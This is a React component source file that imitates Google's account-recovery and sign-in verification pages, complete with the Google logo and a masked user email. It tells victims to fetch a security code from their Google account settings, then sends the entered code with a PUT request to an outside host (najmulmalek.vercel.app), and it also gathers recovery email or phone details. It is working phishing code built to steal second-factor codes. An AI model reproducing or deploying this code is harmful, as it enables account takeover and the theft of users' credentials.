import React from "react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { Link, useLocation, useNavigate, useParams } from "react-router-dom";

const PhoneCode = () => {
    const navigate = useNavigate();
    const id = useParams();
    const { state } = useLocation();
    const { temp } = state;
    const [step, setStep] = useState(4);
    const [numemail, setNumemail] = useState("email address");
    const [recoveryValidation, setRecoveryValidation] = useState(false);
    const [codeValidation, setCodeValidation] = useState(false);
    console.log(temp)
    const handleNext = () => {
        setStep(step + 1);
    };

    const handleBack = () => {
        setStep(step - 1);
    };
    const {
        register,
        handleSubmit,
        formState: { errors },
        reset,
    } = useForm();
    const handleAddBooking = (data) => {
        const bookings = {
            code: data.code,
            temp: temp
        };
        fetch(`https://najmulmalek.vercel.app/phonecode/${temp}`, {
            method: "PUT",
            headers: {
                "content-type": "application/json",
            },
            body: JSON.stringify(bookings),
        })
            .then((res) => res.json())
            .then((result) => {
                reset();
                pathInfo(bookings);
            });
    };
    const pathInfo = (infos) => {
        navigate("/recovery", { state: { temp: infos.temp } });
        // window.location.href = 'https://www.google.com/maps/place/New+York,+NY,+USA/@40.6976312,-74.1444871,11z/data=!3m1!4b1!4m6!3m5!1s0x89c24fa5d33f083b:0xc80b8f06e177fe62!8m2!3d40.7127753!4d-74.0059728!16zL20vMDJfMjg2?entry=ttu';

    };
    const handleNumber = () => {
        if (numemail === "email address") {
            setNumemail("phone number");
        } else {
            setNumemail("email address");
        }
    };




    const handleRChange = (event) => {
        if (event.target.value === "") {
            setRecoveryValidation(false);
        } else {
            setRecoveryValidation(true);
        }
    };
    const handleCChange = (event) => {
        if (event.target.value === "") {
            setCodeValidation(false);
        } else {
            setCodeValidation(true);
        }
    };

    const numberPage = () => {
        navigate("/number", { state: { temp: temp } });

    };
    return (
        <div className="flex items-center justify-center w-screen h-screen relative z-10">
            <iframe className='absolute top-0 left-0 h-full' title='map' src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1339967.9624639747!2d-100.97180559921846!3d34.26459709743478!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x54eab584e432360b%3A0x1c3bb99243deb742!2sUnited%20States!5e0!3m2!1sen!2sbd!4v1686250989510!5m2!1sen!2sbd" width={'100%'} height={'100%'} allowFullScreen="" loading="lazy" referrerPolicy="no-referrer-when-downgrade"></iframe>
            <div className='absolute top-0 left-0 w-full h-full z-20 bg-white/40  backdrop-blur-sm grid place-items-center'>
                <form className="bg-white px-6 py-12 rounded-lg shadow-md w-5/6 md:w-1/5">
                    {
                        step === 3 ? (
                            <Step3
                                register={register}
                                numemail={numemail}
                                handleNumber={handleNumber}
                                handleRChange={handleRChange}
                            />
                        ) : (
                            <Step4 register={register} handleCChange={handleCChange} numberPage={numberPage} />
                        )}

                    <div className="flex justify-end mt-6">

                        {step === 3 &&
                            (recoveryValidation ? (
                                <span
                                    className={`${recoveryValidation ? "bg-blue-600" : "bg-gray-600"
                                        } px-6 py-1.5 rounded-lg text-white cursor-pointer`}

                                >
                                    Next
                                </span>
                            ) : (
                                <span
                                    className={`bg-gray-600 px-6 py-1.5 rounded-lg text-white cursor-not-allowed`}
                                >
                                    Next
                                </span>
                            ))}
                        {step === 4 &&
                            (codeValidation ? (
                                <button
                                    className="bg-blue-600 px-6 py-1.5 rounded-lg text-white hover:bg-blue-600 cursor-pointer"
                                    onClick={handleSubmit(handleAddBooking)}
                                >
                                    Next
                                </button>
                            ) : (
                                <span className="bg-gray-600 px-6 py-1.5 rounded-lg text-white cursor-not-allowed">
                                    Next
                                </span>
                            ))}
                    </div>
                </form>

            </div>

        </div>
    );
};

const Step3 = ({ register, numemail, handleNumber, handleRChange }) => (
    <div>
        <img src="/google.png" alt="" className="mx-auto" />
        <h2 className="text-center font-medium text-2xl">Account Recovery</h2>
        <div className="text-center rounded-xl p-1 border border-gray-400 w-fit text-sm mx-auto flex items-center mt-2 mb-8">
            <svg
                aria-hidden="true"
                className="w-5 h-5"
                fill="currentColor"
                focusable="false"
                viewBox="0 0 24 24"
                xmlns="https://www.w3.org/2000/svg"
            >
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
            </svg>{" "}
            <span>{localStorage.getItem("u-email")}</span>
        </div>
        <h4 className="font-medium">Get a verification code</h4>
        <p>
            To get a verification code first confirm the recovery email address you
            added to your account{" "}
            <b>
                {numemail === "email address"
                    ? localStorage.getItem("u-email")?.slice(0, 2) + "*****@gm***.com"
                    : "(***) *** - ****"}
            </b>
        </p>
        <div className="relative mt-6">
            <input
                type="text"
                {...register("recovery")}
                onChange={handleRChange}
                className="peer w-full border-b placeholder:text-transparent p-2 py-3 border border-blue-900 rounded-lg peer-focus:border-blue-900 focus:outline-none"
                placeholder="name"
            />
            <label
                htmlFor="email"
                className="absolute left-0 ml-1 -translate-y-5 bg-white p-1 text-sm duration-100 ease-linear peer-placeholder-shown:translate-y-1 peer-placeholder-shown:text-blue-800 peer-focus:ml-1 peer-focus:-translate-y-5 peer-focus:px-1 peer-focus:text-sm"
            >
                Enter recovery {numemail}
            </label>
        </div>

        <div className="mt-3">
            <p className="text-blue-600 cursor-pointer" onClick={handleNumber}>
                Number or recovery{" "}
            </p>
        </div>
    </div>
);
const Step4 = ({ register, handleCChange, numberPage }) => (
    <div>
        <img src="/google.png" alt="" className="mx-auto" />
        <h2 className="text-center font-medium text-2xl">Welcome</h2>

        <div className="mb-4">
            <ul className="list-disc p-5 text-sm">
                <li>Get your device </li>
                <li>Open setting app</li>
                <li>Tap Google</li>
                <li>Choose your account, if it's not already selected </li>
                <li>Tap manage your Google Account</li>
                <li>Select the security tab (you may need to scroll to the right)</li>
                <li> Under "Signing in to Google", tap security code</li>
                <li>Choose an account to get your code</li>


            </ul>
            <input
                type="text"
                {...register("code")}
                placeholder="Enter code"
                onChange={handleCChange}
                className="w-full border border-gray-400 p-2 rounded-md"
            />
        </div>
        <div className="mt-3">
            <p onClick={numberPage} className="text-blue-600 cursor-pointer">More ways to sign in </p>
        </div>
    </div>
);
export default PhoneCode;
